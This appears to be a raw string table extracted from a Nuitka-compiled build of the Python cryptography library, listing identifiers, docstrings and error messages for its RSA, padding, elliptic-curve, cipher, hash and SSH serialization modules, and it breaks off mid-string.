        aprivate_bytes_rawuEd448PrivateKey.private_bytes_rawax448ucryptography\hazmat\primitives\asymmetric\ed448.pyu<module cryptography.hazmat.primitives.asymmetric.ed448>Ta__class__TaselfaotherTaclsadataabackendTaclsabackendTaselfaencodingaformataencryption_algorithmTaselfTaselfaencodingaformatTaselfadataTaselfasignatureadatau.cryptography.hazmat.primitives.asymmetric.padding8]a_mgfa_MaxLengtha_Autoa_DigestLengthusalt_length must be an integer, MAX_LENGTH, DIGEST_LENGTH, or AUTOlusalt_length must be zero or greater.a_salt_lengthahashesaHashAlgorithmuExpected instance of hashes.HashAlgorithm.a_algorithma_labelarsaaRSAPrivateKeyaRSAPublicKeyukey must be an RSA public or private keyakey_sizelladigest_sizela__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaabcucryptography.hazmat.primitivesTahashesucryptography.hazmat.primitives._asymmetricTaAsymmetricPaddingaAsymmetricPaddingucryptography.hazmat.primitives.asymmetricTarsaa__prepare__aPKCS1v15a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.hazmat.primitives.asymmetric.paddinga__module__a__qualname__uEMSA-PKCS1-v1_5anamea__orig_bases__uSentinel value for `MAX_LENGTH`.uSentinel value for `AUTO`.uSentinel value for `DIGEST_LENGTH`.aPSSa__annotations__aMAX_LENGTHaAUTOaDIGEST_LENGTHuEMSA-PSSuint | _MaxLength | _Auto | _DigestLengthDamgfasalt_lengthareturnaMGFuint | _MaxLength | _Auto | _DigestLengthaNonea__init__uPSS.__init__apropertyDareturnaMGFamgfuPSS.mgfaOAEPuEME-OAEPDamgfaalgorithmalabelaMGFuhashes.HashAlgorithmubytes | NoneuOAEP.__init__Dareturnuhashes.HashAlgorithmaalgorithmuOAEP.algorithmuOAEP.mgfametaclassaABCMetaTaMGFTaMGFuhashes.HashAlgorithmaMGF1Daalgorithmuhashes.HashAlgorithmuMGF1.__init__Dakeyahash_algorithmareturnursa.RSAPrivateKey | rsa.RSAPublicKeyuhashes.HashAlgorithmaintacalculate_max_pss_salt_lengthucryptography\hazmat\primitives\asymmetric\padding.pyu<module cryptography.hazmat.primitives.asymmetric.padding>Ta__class__TaselfaalgorithmTaselfamgfaalgorithmalabelTaselfamgfasalt_lengthTaselfTakeyahash_algorithmaemlenasalt_lengthu.cryptography.hazmat.primitives.asymmetric.rsa=a_verify_rsa_parametersarust_opensslarsaagenerate_private_keyTllupublic_exponent must be either 3 (for legacy compatibility) or 65537. Almost everyone should choose 65537 here!lukey_size must be at least 1024-bits.Tllutoo many values to unpack (expected 2)wblwaax1ax2utoo many values to unpack (expected 4)u
    Modular Multiplicative Inverse. Returns x such that: (x*e) mod m == 1
    a_modinvu
    Compute the CRT (q ** -1) % p value from RSA primes p and q.
    lu
    Compute the CRT private_exponent % (p - 1) value from the RSA
    private_exponent (d) and p.
    u
    Compute the CRT private_exponent % (q - 1) value from the RSA
    private_exponent (d) and q.
    agcdu
    Compute the RSA private_exponent (d) given the public exponent (e)
    and the RSA primes p and q.

    This uses the Carmichael totient function to generate the
    smallest possible working value of the private exponent.
    wtlaspotteda_MAX_RECOVERY_ATTEMPTSwkapowwnuUnable to compute factors p and q from exponent d.wpasortedDareversetu
    Compute factors p and q from the private exponent d. We assume that n has
    no more than two factors. This function is adapted from code in PyCrypto.
    a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaabcatypingamathTagcducryptography.hazmat.bindings._rustTaopensslaopensslucryptography.hazmat.primitivesTa_serializationahashesa_serializationahashesucryptography.hazmat.primitives._asymmetricTaAsymmetricPaddingaAsymmetricPaddingucryptography.hazmat.primitives.asymmetricTautilsautilsaasym_utilsametaclassaABCMetaa__prepare__TaRSAPrivateKeyTa__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.hazmat.primitives.asymmetric.rsaa__module__aRSAPrivateKeya__qualname__aabstractmethodDaciphertextapaddingareturnabytesaAsymmetricPaddingabytesu
        Decrypts the provided ciphertext.
        adecryptuRSAPrivateKey.decryptapropertyDareturnaintu
        The bit length of the public modulus.
        akey_sizeuRSAPrivateKey.key_sizeDareturnaRSAPublicKeyu
        The RSAPublicKey associated with this private key.
        apublic_keyuRSAPrivateKey.public_keyDadataapaddingaalgorithmareturnabytesaAsymmetricPaddinguasym_utils.Prehashed | hashes.HashAlgorithmabytesu
        Signs the data.
        asignuRSAPrivateKey.signDareturnaRSAPrivateNumbersu
        Returns an RSAPrivateNumbers.
        aprivate_numbersuRSAPrivateKey.private_numbersDaencodingaformataencryption_algorithmareturnu_serialization.Encodingu_serialization.PrivateFormatu_serialization.KeySerializationEncryptionabytesu
        Returns the key serialized as bytes.
        aprivate_bytesuRSAPrivateKey.private_bytesaRSAPrivateKeyWithSerializationaregisterTaRSAPublicKeyTaRSAPublicKeyDaplaintextapaddingareturnabytesaAsymmetricPaddingabytesu
        Encrypts the given plaintext.
        aencryptuRSAPublicKey.encryptuRSAPublicKey.key_sizeDareturnaRSAPublicNumbersu
        Returns an RSAPublicNumbers
        apublic_numbersuRSAPublicKey.public_numbersDaencodingaformatareturnu_serialization.Encodingu_serialization.PublicFormatabytesapublic_bytesuRSAPublicKey.public_bytesDasignatureadataapaddingaalgorithmareturnabytespaAsymmetricPaddinguasym_utils.Prehashed | hashes.HashAlgorithmaNoneu
        Verifies the signature of the data.
        averifyuRSAPublicKey.verifyDasignatureapaddingaalgorithmareturnabytesaAsymmetricPaddinguhashes.HashAlgorithm | Noneabytesu
        Recovers the original data from the signature.
        arecover_data_from_signatureuRSAPublicKey.recover_data_from_signatureDaotherareturnaobjectaboolu
        Checks equality.
        a__eq__uRSAPublicKey.__eq__aRSAPublicKeyWithSerializationaRSAPrivateNumbersaRSAPublicNumbersTnDapublic_exponentakey_sizeabackendareturnaintputyping.AnyaRSAPrivateKeyDapublic_exponentakey_sizeareturnaintpaNoneDwewmareturnaintppDwpwqareturnaintpparsa_crt_iqmpDaprivate_exponentwpareturnaintpparsa_crt_dmp1Daprivate_exponentwqareturnaintpparsa_crt_dmq1Dwewpwqareturnaintppparsa_recover_private_exponentlDwnwewdareturnaintpputuple[int, int]arsa_recover_prime_factorsucryptography\hazmat\primitives\asymmetric\rsa.pyu<module cryptography.hazmat.primitives.asymmetric.rsa>Ta__class__TaselfaotherTwewmax1ax2wawbwqwraxnTapublic_exponentakey_sizeTaselfaciphertextapaddingTaselfaplaintextapaddingTapublic_exponentakey_sizeabackendTaselfTaselfaencodingaformataencryption_algorithmTaselfaencodingaformatTaselfasignatureapaddingaalgorithmTaprivate_exponentwpTaprivate_exponentwqTwpwqTwnwewdaktotwtaspottedwawkacandwpwqwrTwewpwqalambda_nTaselfadataapaddingaalgorithmTaselfasignatureadataapaddingaalgorithmu.cryptography.hazmat.primitives.asymmetric.typesFAa__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsatypingacryptographyTautilslautilsucryptography.hazmat.primitives.asymmetricTadhadsaaecaed448aed25519arsaax448ax25519adhadsaaecaed448aed25519arsaax448ax25519aUnionaDHPublicKeyaDSAPublicKeyaRSAPublicKeyaEllipticCurvePublicKeyaEd25519PublicKeyaEd448PublicKeyaX25519PublicKeyaX448PublicKeyaPublicKeyTypesaPUBLIC_KEY_TYPESadeprecateducryptography.hazmat.primitives.asymmetric.typesuUse PublicKeyTypes insteadaDeprecatedIn40DanameaPUBLIC_KEY_TYPESaDHPrivateKeyaEd25519PrivateKeyaEd448PrivateKeyaRSAPrivateKeyaDSAPrivateKeyaEllipticCurvePrivateKeyaX25519PrivateKeyaX448PrivateKeyaPrivateKeyTypesaPRIVATE_KEY_TYPESuUse PrivateKeyTypes insteadDanameaPRIVATE_KEY_TYPESaCertificateIssuerPrivateKeyTypesaCERTIFICATE_PRIVATE_KEY_TYPESuUse CertificateIssuerPrivateKeyTypes insteadDanameaCERTIFICATE_PRIVATE_KEY_TYPESaCertificateIssuerPublicKeyTypesaCERTIFICATE_ISSUER_PUBLIC_KEY_TYPESuUse CertificateIssuerPublicKeyTypes insteadDanameaCERTIFICATE_ISSUER_PUBLIC_KEY_TYPESaCertificatePublicKeyTypesaCERTIFICATE_PUBLIC_KEY_TYPESuUse CertificatePublicKeyTypes insteadDanameaCERTIFICATE_PUBLIC_KEY_TYPESucryptography\hazmat\primitives\asymmetric\types.pyu<module cryptography.hazmat.primitives.asymmetric.types>u.cryptography.hazmat.primitives.asymmetric.utils$ahashesaHashAlgorithmuExpected instance of HashAlgorithm.a_algorithmadigest_sizea_digest_sizea__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsucryptography.hazmat.bindings._rustTaasn1laasn1ucryptography.hazmat.primitivesTahashesadecode_dss_signatureaencode_dss_signatureucryptography.hazmat.primitives.asymmetric.utilsa__module__aPrehasheda__qualname__Daalgorithmuhashes.HashAlgorithma__init__uPrehashed.__init__DareturnaintuPrehashed.digest_sizeucryptography\hazmat\primitives\asymmetric\utils.pyu<module cryptography.hazmat.primitives.asymmetric.utils>Ta__class__TaselfaalgorithmTaselfu.cryptography.hazmat.primitives.asymmetric.x25519
\ucryptography.hazmat.backends.openssl.backendTabackendlabackendax25519_supportedaUnsupportedAlgorithmuX25519 is not supported by this version of OpenSSL.a_ReasonsaUNSUPPORTED_EXCHANGE_ALGORITHMarust_opensslax25519afrom_public_bytesagenerate_keyafrom_private_bytesa__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaabcucryptography.exceptionsTaUnsupportedAlgorithma_Reasonsucryptography.hazmat.bindings._rustTaopensslaopensslucryptography.hazmat.primitivesTa_serializationa_serializationametaclassaABCMetaa__prepare__TaX25519PublicKeyTa__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.hazmat.primitives.asymmetric.x25519a__module__aX25519PublicKeya__qualname__aclassmethodDadataareturnabytesaX25519PublicKeyuX25519PublicKey.from_public_bytesaabstractmethodDaencodingaformatareturnu_serialization.Encodingu_serialization.PublicFormatabytesu
        The serialized bytes of the public key.
        apublic_bytesuX25519PublicKey.public_bytesDareturnabytesu
        The raw bytes of the public key.
        Equivalent to public_bytes(Raw, Raw).
        apublic_bytes_rawuX25519PublicKey.public_bytes_rawDaotherareturnaobjectaboolu
        Checks equality.
        a__eq__uX25519PublicKey.__eq__aregisterTaX25519PrivateKeyTaX25519PrivateKeyDareturnaX25519PrivateKeyagenerateuX25519PrivateKey.generateDadataareturnabytesaX25519PrivateKeyuX25519PrivateKey.from_private_bytesDareturnaX25519PublicKeyu
        Returns the public key associated with this private key
        apublic_keyuX25519PrivateKey.public_keyDaencodingaformataencryption_algorithmareturnu_serialization.Encodingu_serialization.PrivateFormatu_serialization.KeySerializationEncryptionabytesu
        The serialized bytes of the private key.
        aprivate_bytesuX25519PrivateKey.private_bytesu
        The raw bytes of the private key.
        Equivalent to private_bytes(Raw, Raw, NoEncryption()).
        aprivate_bytes_rawuX25519PrivateKey.private_bytes_rawDapeer_public_keyareturnaX25519PublicKeyabytesu
        Performs a key exchange operation using the provided peer's public key.
        aexchangeuX25519PrivateKey.exchangeucryptography\hazmat\primitives\asymmetric\x25519.pyu<module cryptography.hazmat.primitives.asymmetric.x25519>Ta__class__TaselfaotherTaselfapeer_public_keyTaclsadataabackendTaclsabackendTaselfaencodingaformataencryption_algorithmTaselfTaselfaencodingaformatu.cryptography.hazmat.primitives.asymmetric.x448\ucryptography.hazmat.backends.openssl.backendTabackendlabackendax448_supportedaUnsupportedAlgorithmuX448 is not supported by this version of OpenSSL.a_ReasonsaUNSUPPORTED_EXCHANGE_ALGORITHMarust_opensslax448afrom_public_bytesagenerate_keyafrom_private_bytesa__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaabcucryptography.exceptionsTaUnsupportedAlgorithma_Reasonsucryptography.hazmat.bindings._rustTaopensslaopensslucryptography.hazmat.primitivesTa_serializationa_serializationametaclassaABCMetaa__prepare__TaX448PublicKeyTa__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.hazmat.primitives.asymmetric.x448a__module__aX448PublicKeya__qualname__aclassmethodDadataareturnabytesaX448PublicKeyuX448PublicKey.from_public_bytesaabstractmethodDaencodingaformatareturnu_serialization.Encodingu_serialization.PublicFormatabytesu
        The serialized bytes of the public key.
        apublic_bytesuX448PublicKey.public_bytesDareturnabytesu
        The raw bytes of the public key.
        Equivalent to public_bytes(Raw, Raw).
        apublic_bytes_rawuX448PublicKey.public_bytes_rawDaotherareturnaobjectaboolu
        Checks equality.
        a__eq__uX448PublicKey.__eq__aregisterTaX448PrivateKeyTaX448PrivateKeyDareturnaX448PrivateKeyagenerateuX448PrivateKey.generateDadataareturnabytesaX448PrivateKeyuX448PrivateKey.from_private_bytesDareturnaX448PublicKeyu
        Returns the public key associated with this private key
        apublic_keyuX448PrivateKey.public_keyDaencodingaformataencryption_algorithmareturnu_serialization.Encodingu_serialization.PrivateFormatu_serialization.KeySerializationEncryptionabytesu
        The serialized bytes of the private key.
        aprivate_bytesuX448PrivateKey.private_bytesu
        The raw bytes of the private key.
        Equivalent to private_bytes(Raw, Raw, NoEncryption()).
        aprivate_bytes_rawuX448PrivateKey.private_bytes_rawDapeer_public_keyareturnaX448PublicKeyabytesu
        Performs a key exchange operation using the provided peer's public key.
        aexchangeuX448PrivateKey.exchangeucryptography\hazmat\primitives\asymmetric\x448.pyu<module cryptography.hazmat.primitives.asymmetric.x448>Ta__class__TaselfaotherTaselfapeer_public_keyTaclsadataabackendTaclsabackendTaselfaencodingaformataencryption_algorithmTaselfTaselfaencodingaformatu.cryptography.hazmat.primitives.ciphers.algorithmsia_verify_key_sizeakeylautilsa_check_byteslikeanonceunonce must be 128-bits (16 bytes)a_noncea__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsacryptographyTautilslucryptography.hazmat.decrepit.ciphers.algorithmsTaARC4aARC4TaCAST5aCAST5TaIDEAaIDEATaSEEDaSEEDTaBlowfishaBlowfishTaTripleDESaTripleDESucryptography.hazmat.primitives._cipheralgorithmTa_verify_key_sizeucryptography.hazmat.primitives.ciphersTaBlockCipherAlgorithmaCipherAlgorithmaBlockCipherAlgorithmaCipherAlgorithma__prepare__aAESa__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.hazmat.primitives.ciphers.algorithmsa__module__a__qualname__anamelablock_sizeafrozensetLllllPllllakey_sizesDakeyabytesa__init__uAES.__init__apropertyDareturnaintakey_sizeuAES.key_sizea__orig_bases__aAES128PluAES128.__init__aAES256lPluAES256.__init__aCamelliaacamellialPllluCamellia.__init__uCamellia.key_sizeadeprecateduARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.aDeprecatedIn43DanameaARC4uTripleDES has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.TripleDES and will be removed from this module in 48.0.0.DanameaTripleDESuBlowfish has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.Blowfish and will be removed from this module in 45.0.0.aDeprecatedIn37DanameaBlowfishuCAST5 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.CAST5 and will be removed from this module in 45.0.0.DanameaCAST5uIDEA has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.IDEA and will be removed from this module in 45.0.0.DanameaIDEAuSEED has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.SEED and will be removed from this module in 45.0.0.DanameaSEEDaChaCha20DakeyanonceabytespuChaCha20.__init__DareturnabytesuChaCha20.nonceuChaCha20.key_sizeaSM4uSM4.__init__uSM4.key_sizeucryptography\hazmat\primitives\ciphers\algorithms.pyu<module cryptography.hazmat.primitives.ciphers.algorithms>Ta__class__TaselfakeyTaselfakeyanonceTaselfu.cryptography.hazmat.primitives.ciphers.basednaCipherAlgorithmuExpected interface of CipherAlgorithm.amodesaModeavalidate_for_algorithmaalgorithmamodeaModeWithAuthenticationTagataguAuthentication tag must be None when encrypting.arust_opensslaciphersacreate_encryption_ctxacreate_decryption_ctxa__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaabclatypingucryptography.hazmat.bindings._rustTaopensslaopensslucryptography.hazmat.primitives._cipheralgorithmTaCipherAlgorithmucryptography.hazmat.primitives.ciphersTamodesametaclassaABCMetaa__prepare__TaCipherContextTa__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.hazmat.primitives.ciphers.basea__module__aCipherContexta__qualname__aabstractmethodDadataareturnabytespu
        Processes the provided bytes through the cipher and returns the results
        as bytes.
        aupdateuCipherContext.updateDadataabufareturnabytespaintu
        Processes the provided bytes and writes the resulting data into the
        provided buffer. Returns the number of bytes written.
        aupdate_intouCipherContext.update_intoDareturnabytesu
        Returns the results of processing the final block as bytes.
        afinalizeuCipherContext.finalizeDanonceareturnabytesaNoneu
        Resets the nonce for the cipher context to the provided value.
        Raises an exception if it does not support reset or if the
        provided nonce does not have a valid length.
        areset_nonceuCipherContext.reset_nonceaAEADCipherContextDadataareturnabytesaNoneu
        Authenticates the provided bytes.
        aauthenticate_additional_datauAEADCipherContext.authenticate_additional_dataa__orig_bases__aAEADDecryptionContextDatagareturnabytespu
        Returns the results of processing the final block as bytes and allows
        delayed passing of the authentication tag.
        afinalize_with_taguAEADDecryptionContext.finalize_with_tagaAEADEncryptionContextapropertyu
        Returns tag bytes. This is only available after encryption is
        finalized.
        uAEADEncryptionContext.tagaTypeVaraOptionalTaModeTaboundacovariantaGenericaCipherTnDaalgorithmamodeabackendareturnaCipherAlgorithmaModeutyping.AnyaNonea__init__uCipher.__init__aoverloadDaselfareturnuCipher[modes.ModeWithAuthenticationTag]aAEADEncryptionContextaencryptoruCipher.encryptorDaselfareturna_CIPHER_TYPEaCipherContextDaselfareturnuCipher[modes.ModeWithAuthenticationTag]aAEADDecryptionContextadecryptoruCipher.decryptoraUnionaModeWithNonceaModeWithTweakaECBaModeWithInitializationVectora_CIPHER_TYPEaregisterucryptography\hazmat\primitives\ciphers\base.pyu<module cryptography.hazmat.primitives.ciphers.base>Ta__class__TaselfaalgorithmamodeabackendTaselfadataTaselfTaselfatagTaselfanonceTaselfadataabufu.cryptography.hazmat.primitives.ciphers&a__doc__a__file__apathadirnameajoinaenvironagetTaNUITKA_PACKAGE_cryptographyu\not_existinguhazmat\primitives\ciphersTaNUITKA_PACKAGE_cryptography_hazmatu\not_existinguprimitives\ciphersTaNUITKA_PACKAGE_cryptography_hazmat_primitivesu\not_existingaciphersTaNUITKA_PACKAGE_cryptography_hazmat_primitives_ciphersu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__aannotationsucryptography.hazmat.primitives._cipheralgorithmTaBlockCipherAlgorithmaCipherAlgorithmlaBlockCipherAlgorithmaCipherAlgorithmucryptography.hazmat.primitives.ciphers.baseTaAEADCipherContextaAEADDecryptionContextaAEADEncryptionContextaCipheraCipherContextaAEADCipherContextaAEADDecryptionContextaAEADEncryptionContextaCipheraCipherContextLaAEADCipherContextaAEADDecryptionContextaAEADEncryptionContextaBlockCipherAlgorithmaCipheraCipherAlgorithmaCipherContexta__all__ucryptography\hazmat\primitives\ciphers\__init__.pyu<module cryptography.hazmat.primitives.ciphers>u.cryptography.hazmat.primitives.ciphers.modesLakey_sizelanameaAESuOnly 128, 192, and 256 bit keys are allowed for this AES modeainitialization_vectorlablock_sizeuInvalid IV size (uu) for w.aBlockCipherAlgorithmaUnsupportedAlgorithmu requires a block cipher algorithma_ReasonsaUNSUPPORTED_CIPHERuInvalid nonce size (a_check_aes_key_lengtha_check_iv_lengthautilsa_check_byteslikea_initialization_vectoratweakutweak must be 128-bits (16 bytes)a_tweakaalgorithmsaAES128aAES256uThe AES128 and AES256 classes do not support XTS, please use the standard AES class instead.TlluThe XTS specification requires a 256-bit key for AES-128-XTS and 512-bit key for AES-256-XTSanoncea_noncea_check_nonce_lengthuinitialization_vector must be between 8 and 128 bytes (64 and 1024 bits).a_check_bytesataglumin_tag_length must be >= 4uAuthentication tag must be u bytes or longer.a_taga_min_tag_lengthuGCM requires a block cipher algorithmuAuthentication tag cannot be more than u bytes.a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaabclacryptographyTautilsucryptography.exceptionsTaUnsupportedAlgorithma_Reasonsucryptography.hazmat.primitives._cipheralgorithmTaBlockCipherAlgorithmaCipherAlgorithmaCipherAlgorithmucryptography.hazmat.primitives.ciphersTaalgorithmsametaclassaABCMetaa__prepare__TaModeTa__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.hazmat.primitives.ciphers.modesa__module__aModea__qualname__apropertyaabstractmethodDareturnastru
        A string naming this mode (e.g. "ECB", "CBC").
        uMode.nameDaalgorithmareturnaCipherAlgorithmaNoneu
        Checks that all the necessary invariants of this (mode, algorithm)
        combination are met.
        avalidate_for_algorithmuMode.validate_for_algorithmaModeWithInitializationVectorDareturnabytesu
        The value of the initialization vector for this mode as bytes.
        uModeWithInitializationVector.initialization_vectora__orig_bases__aModeWithTweaku
        The value of the tweak for this mode as bytes.
        uModeWithTweak.tweakaModeWithNonceu
        The value of the nonce for this mode as bytes.
        uModeWithNonce.nonceaModeWithAuthenticationTagDareturnubytes | Noneu
        The value of the tag supplied to the constructor of this mode.
        uModeWithAuthenticationTag.tagDaselfaalgorithmareturnaModeaCipherAlgorithmaNoneDaselfaalgorithmareturnaModeWithInitializationVectoraBlockCipherAlgorithmaNoneDanonceanameaalgorithmareturnabytesastraCipherAlgorithmaNoneDaselfaalgorithmareturnaModeWithInitializationVectoraCipherAlgorithmaNonea_check_iv_and_key_lengthaCBCDainitialization_vectorabytesa__init__uCBC.__init__uCBC.initialization_vectoraXTSDatweakabytesuXTS.__init__uXTS.tweakuXTS.validate_for_algorithmaECBaOFBuOFB.__init__uOFB.initialization_vectoraCFBuCFB.__init__uCFB.initialization_vectoraCFB8uCFB8.__init__uCFB8.initialization_vectoraCTRDanonceabytesuCTR.__init__uCTR.nonceuCTR.validate_for_algorithmaGCMga_MAX_ENCRYPTED_BYTESga_MAX_AAD_BYTESTnlDainitialization_vectoratagamin_tag_lengthabytesubytes | NoneaintuGCM.__init__uGCM.taguGCM.initialization_vectoruGCM.validate_for_algorithmucryptography\hazmat\primitives\ciphers\modes.pyu<module cryptography.hazmat.primitives.ciphers.modes>Ta__class__Taselfainitialization_vectorTaselfanonceTaselfainitialization_vectoratagamin_tag_lengthTaselfatweakTaselfaalgorithmTaselfaalgorithmaiv_lenTanonceanameaalgorithmTaselfTaselfaalgorithmablock_size_bytes.cryptography.hazmat.primitivesa__doc__a__file__apathadirnameajoinaenvironagetTaNUITKA_PACKAGE_cryptographyu\not_existinguhazmat\primitivesTaNUITKA_PACKAGE_cryptography_hazmatu\not_existingaprimitivesTaNUITKA_PACKAGE_cryptography_hazmat_primitivesu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__ucryptography\hazmat\primitives\__init__.pyu<module cryptography.hazmat.primitives>u.cryptography.hazmat.primitives.constant_timeua and b must be bytes.ahmacacompare_digesta__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationslDwawbareturnabytespaboolabytes_equcryptography\hazmat\primitives\constant_time.pyu<module cryptography.hazmat.primitives.constant_time>Twawbu.cryptography.hazmat.primitives.hashes
udigest_size must be an integerludigest_size must be a positive integera_digest_sizel@uDigest size must be 64l uDigest size must be 32a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaabclucryptography.hazmat.bindings._rustTaopensslaopensslarust_opensslLaMD5aSHA1aSHA3_224aSHA3_256aSHA3_384aSHA3_512aSHA224aSHA256aSHA384aSHA512aSHA512_224aSHA512_256aSHAKE128aSHAKE256aSM3aBLAKE2baBLAKE2saExtendableOutputFunctionaHashaHashAlgorithmaHashContexta__all__ametaclassaABCMetaa__prepare__TaHashAlgorithmTa__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.hazmat.primitives.hashesa__module__aHashAlgorithma__qualname__apropertyaabstractmethodDareturnastru
        A string naming this algorithm (e.g. "sha256", "md5").
        anameuHashAlgorithm.nameDareturnaintu
        The size of the resulting digest in bytes.
        adigest_sizeuHashAlgorithm.digest_sizeDareturnuint | Noneu
        The internal block size of the hash function, or None if the hash
        function does not use blocks internally (e.g. SHA3).
        ablock_sizeuHashAlgorithm.block_sizeTaHashContextTaHashContextDareturnaHashAlgorithmu
        A HashAlgorithm that will be used by this context.
        aalgorithmuHashContext.algorithmDadataareturnabytesaNoneu
        Processes the provided bytes through the hash.
        aupdateuHashContext.updateDareturnabytesu
        Finalizes the hash context and returns the hash digest as bytes.
        afinalizeuHashContext.finalizeDareturnaHashContextu
        Return a HashContext that is a copy of the current context.
        acopyuHashContext.copyahashesaHasharegisterTaExtendableOutputFunctionTu
    An interface for extendable output functions.
    aExtendableOutputFunctionaSHA1asha1la__orig_bases__aSHA512_224usha512-224llaSHA512_256usha512-256aSHA224asha224aSHA256asha256aSHA384asha384l0aSHA512asha512aSHA3_224usha3-224aSHA3_256usha3-256aSHA3_384usha3-384aSHA3_512usha3-512aSHAKE128ashake128Dadigest_sizeainta__init__uSHAKE128.__init__uSHAKE128.digest_sizeaSHAKE256ashake256uSHAKE256.__init__uSHAKE256.digest_sizeaMD5amd5laBLAKE2bablake2ba_max_digest_sizea_min_digest_sizeuBLAKE2b.__init__uBLAKE2b.digest_sizeaBLAKE2sablake2suBLAKE2s.__init__uBLAKE2s.digest_sizeaSM3asm3ucryptography\hazmat\primitives\hashes.pyu<module cryptography.hazmat.primitives.hashes>Ta__class__Taselfadigest_sizeTaselfTaselfadatau.cryptography.hazmat.primitives.serialization.basea__doc__a__file__a__spec__aoriginahas_locationa__cached__ucryptography.hazmat.bindings._rustTaopenssllaopensslarust_opensslakeysaload_pem_private_keyaload_der_private_keyaload_pem_public_keyaload_der_public_keyadhafrom_pem_parametersaload_pem_parametersafrom_der_parametersaload_der_parametersucryptography\hazmat\primitives\serialization\base.pyu<module cryptography.hazmat.primitives.serialization.base>u.cryptography.hazmat.primitives.serialization9a__doc__a__file__apathadirnameajoinaenvironagetTaNUITKA_PACKAGE_cryptographyu\not_existinguhazmat\primitives\serializationTaNUITKA_PACKAGE_cryptography_hazmatu\not_existinguprimitives\serializationTaNUITKA_PACKAGE_cryptography_hazmat_primitivesu\not_existingaserializationTaNUITKA_PACKAGE_cryptography_hazmat_primitives_serializationu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__aannotationsucryptography.hazmat.primitives._serializationTaBestAvailableEncryptionaEncodingaKeySerializationEncryptionaNoEncryptionaParameterFormataPrivateFormataPublicFormata_KeySerializationEncryptionlaBestAvailableEncryptionaEncodingaKeySerializationEncryptionaNoEncryptionaParameterFormataPrivateFormataPublicFormata_KeySerializationEncryptionucryptography.hazmat.primitives.serialization.baseTaload_der_parametersaload_der_private_keyaload_der_public_keyaload_pem_parametersaload_pem_private_keyaload_pem_public_keyaload_der_parametersaload_der_private_keyaload_der_public_keyaload_pem_parametersaload_pem_private_keyaload_pem_public_keyucryptography.hazmat.primitives.serialization.sshT
aSSHCertificateaSSHCertificateBuilderaSSHCertificateTypeaSSHCertPrivateKeyTypesaSSHCertPublicKeyTypesaSSHPrivateKeyTypesaSSHPublicKeyTypesaload_ssh_private_keyaload_ssh_public_identityaload_ssh_public_keyaSSHCertificateaSSHCertificateBuilderaSSHCertificateTypeaSSHCertPrivateKeyTypesaSSHCertPublicKeyTypesaSSHPrivateKeyTypesaSSHPublicKeyTypesaload_ssh_private_keyaload_ssh_public_identityaload_ssh_public_keyLaBestAvailableEncryptionaEncodingaKeySerializationEncryptionaNoEncryptionaParameterFormataPrivateFormataPublicFormataSSHCertPrivateKeyTypesaSSHCertPublicKeyTypesaSSHCertificateaSSHCertificateBuilderaSSHCertificateTypeaSSHPrivateKeyTypesaSSHPublicKeyTypesa_KeySerializationEncryptionaload_der_parametersaload_der_private_keyaload_der_public_keyaload_pem_parametersaload_pem_private_keyaload_pem_public_keyaload_ssh_private_keyaload_ssh_public_identityaload_ssh_public_keya__all__ucryptography\hazmat\primitives\serialization\__init__.pyu<module cryptography.hazmat.primitives.serialization>u.cryptography.hazmat.primitives.serialization.sshJaUnsupportedAlgorithmTuNeed bcrypt moduleaecaEllipticCurvePrivateKeya_ecdsa_key_typeapublic_keyaEllipticCurvePublicKeyarsaaRSAPrivateKeyaRSAPublicKeya_SSH_RSAadsaaDSAPrivateKeyaDSAPublicKeya_SSH_DSAaed25519aEd25519PrivateKeyaEd25519PublicKeya_SSH_ED25519uUnsupported key typeacurveanamea_ECDSA_KEY_TYPEuUnsupported curve for ssh private key: uuReturn SSH key_type and curve_name for private key.ca_base64_encodeluCorrupt data: missing paddinguRequire data to be full blocksuCorrupt data: unparsed datauAll data should have been parsed.uKey is password-protected.a_SSH_CIPHERSa_bcrypt_kdfakey_lenaiv_lenaCipheraalgamodeuGenerate key + iv and return cipher.uInvalid dataafrom_bytes:nlnDabyteorderabig:lnnaUint32:nln:lnnaUint64a_get_u32utoo many values to unpack (expected 2)uBytes with u32 length prefixa_get_sshstrlabiguBig integer.unegative mpint not allowedabit_lengthlautilsaint_to_bytesuStorage format for signed bigint.aflistaextendaappenduAdd plain bytesato_bytesTlabigTalengthabyteorderuBig-endian uint32TlabiguBig-endian uint64TObytesOmemoryviewObytearrayaput_u32asizeuBytes prefixed with u32 lengthaput_sshstra_to_mpintuBig-endian bigint prefixed with u32 lengthalenuCurrent number of bytesaposadstbufuWrite into bytearrayarenderatobytesuReturn as bytesa_get_mpintuRSA public fieldsaget_publicaRSAPublicNumbersuMake RSA public key from data.uCorrupt data: rsa field mismatcharsa_crt_dmp1arsa_crt_dmq1aRSAPrivateNumbersaprivate_keyuMake RSA 